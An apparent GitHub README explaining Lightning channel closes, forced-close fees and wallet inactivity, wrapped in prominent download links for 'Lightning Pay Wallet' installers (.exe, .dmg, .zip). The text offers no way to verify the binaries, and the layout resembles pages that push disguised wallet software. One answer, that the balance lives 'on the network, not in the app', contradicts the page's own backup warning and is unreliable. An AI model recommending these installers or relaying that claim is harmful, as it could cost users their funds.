<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What happens when a channel closes or a wallet goes quiet
Closed channels return funds on-chain. Inactivity does not lose anything, but it does delay the truth.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Channels are not permanent. They close when you ask, when the counterparty asks, or when the software
decides they are no longer worth keeping. What happens next is orderly, and it is on-chain.

## A cooperative close

The normal case. Both sides agree, the channel's balance is settled in a single on-chain transaction,
and each side's share goes to an address the wallet controls. It costs an on-chain fee, which is why
closing is not free, and it takes a confirmation or two before the money is spendable again.

From the wallet's point of view the Lightning balance drops and an on-chain balance appears. Nothing
is lost; the money changed rails.

## A forced close

If one side disappears, the other can close the channel unilaterally by broadcasting the last agreed
state. That is slower, because the protocol gives a window for disputes, and any party that
broadcasts an outdated state can be penalised. In a wallet that manages channels for you, this is
handled without input, but the wait is real and the funds stay unavailable until it resolves.

## Where the funds go

Back to an address the wallet derives for you, not to some external account. That is the answer to
the question people ask most: a closed channel does not send your bitcoin anywhere you cannot reach,
it returns it to the same wallet on the other rail.

## Inactivity

A wallet closed for weeks is fine. Keys do not expire and channels do not evaporate because you were
away. What can change is the network's view of those channels, so the first launch after a long break
may take longer to sync before the balance is accurate.

The risk of inactivity is not the time itself. It is losing the recovery phrase, or losing the channel
backup, during the months when nothing was open. Time offline costs nothing; a missing backup costs
everything.

## What a forced closure costs you

An on-chain fee, and time. In a forced close the fee is the one encoded when the channel was opened,
not the current market rate, which can make it higher or lower than you would choose today. It is one
of the reasons a wallet may keep a reserve: to be able to close cleanly.

## Questions people ask

### Do I lose my balance if I stay offline for months?

No. The balance is on the network, not in the app. Reopening the wallet and syncing restores the view.

### Why can I not spend the money straight after a close?

Because it is now an on-chain balance waiting for confirmations. Lightning speed does not apply to the
closing transaction.

### Does closing a channel cost a fee?

Yes, an on-chain fee. Routing fees stop; the closing fee is paid once.

## Related guides

- [Do you have to manage Lightning channels yourself?](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/manage-lightning-channels.md)
- [What you actually hold in a Lightning wallet, and how keys are kept](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/what-you-hold-in-a-lightning-wallet.md)
- [What happens to your sats if the wallet company disappears](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/if-the-wallet-company-shuts-down.md)

